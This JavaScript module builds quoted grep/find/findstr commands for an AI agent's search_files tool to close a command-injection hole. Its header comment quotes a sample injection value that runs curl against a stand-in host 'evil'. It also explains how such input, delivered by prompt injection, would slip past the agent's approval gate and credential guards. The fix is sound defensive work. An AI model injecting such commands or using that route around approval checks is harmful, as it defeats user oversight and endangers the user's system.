/**
 * search-command — build the shell command for the agent `search_files` tool
 * with the model/user-supplied pattern SAFELY embedded.
 *
 * The pattern flows into execSync (a real shell), so a raw interpolation
 * (`grep -i "${pattern}"`) is a command-injection vector: a pattern like
 * `x" ; curl evil ; "` runs arbitrary commands — and `search_files` is
 * read-only + NOT confirm-gated, so it would bypass the `run_shell`
 * ApprovalGate + credential guards entirely (reachable via prompt-injection).
 * Raw interpolation is also semantically wrong: the shell would expand `$HOME`,
 * backticks, globs, etc. in the pattern instead of searching for them literally.
 *
 * Fix: quote the pattern so every shell metacharacter is inert. The emitted
 * commands (and therefore the output format `_ingestSearchOutput` parses) are
 * otherwise unchanged.
 */

/** POSIX single-quote: wrap in '…' and escape any embedded ' as '\''. Single
 *  quotes neutralize EVERY shell metacharacter, so nothing inside is expanded
 *  or can break out. */
export function shquotePosix(s) {
  return `'${String(s).replace(/'/g, "'\\''")}'`;
}

/**
 * Build `{ cmd }` for a search, or `{ error }` when the pattern can't be made
 * safe on the target platform.
 *
 * @param {object} a
 * @param {string} a.pattern        the raw search pattern
 * @param {boolean} a.isContent     content search (grep/findstr) vs filename
 * @param {string} [a.platform=process.platform]
 * @returns {{cmd:string}|{error:string}}
 */
export function buildSearchCommand({
  pattern,
  isContent,
  platform = process.platform,
}) {
  const pat = String(pattern ?? "");

  if (platform === "win32") {
    // cmd.exe has no reliable way to escape an embedded double-quote, and the
    // pattern is double-quoted below — so reject a literal `"` (rare in a search
    // pattern; run_shell handles complex cases). Every OTHER metacharacter
    // (& | < > ^ ( )) is literal INSIDE cmd double quotes, so quoting the
    // pattern closes the injection while leaving the redirect (2>NUL) outside.
    if (pat.includes('"')) {
      return {
        error: 'search pattern may not contain a double-quote (") on Windows',
      };
    }
    return {
      cmd: isContent
        ? `findstr /s /i /n "${pat}" *`
        : `dir /s /b "*${pat}*" 2>NUL`,
    };
  }

  return {
    cmd: isContent
      ? `grep -r -l -i ${shquotePosix(pat)} . --include="*" 2>/dev/null | head -20`
      : `find . -name ${shquotePosix(`*${pat}*`)} -type f 2>/dev/null | head -20`,
  };
}
